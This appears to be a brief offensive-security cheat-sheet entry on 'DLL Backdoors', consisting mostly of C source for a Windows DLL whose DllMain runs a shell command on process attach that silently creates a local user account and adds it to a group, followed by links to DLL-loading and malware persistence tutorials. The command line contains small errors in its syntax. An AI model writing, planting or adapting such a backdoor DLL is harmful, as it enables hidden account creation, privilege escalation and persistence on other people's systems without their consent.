# DLL Backdoors

## 01 - Manual

```c
#include <stdio.h>
#include <windows.h>

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         system("cmd /c net user <username> <password> /add /y & net user localgroup \"<group_name>\" \"<username>\" /add /y")
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }
    
    // Successful. If this is FALSE, the process will be terminated eventually
    // https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-entry-point-function#entry-point-function-return-value
    return TRUE;  
}
```

## References

- [TBHaxor: Loading DLLs Using CPP in Windows](https://tbhaxor.com/loading-dlls-using-cpp-in-windows/)

- [Malware Persistence Part 3](https://cocomelonc.github.io/tutorial/2022/05/02/malware-pers-3.html)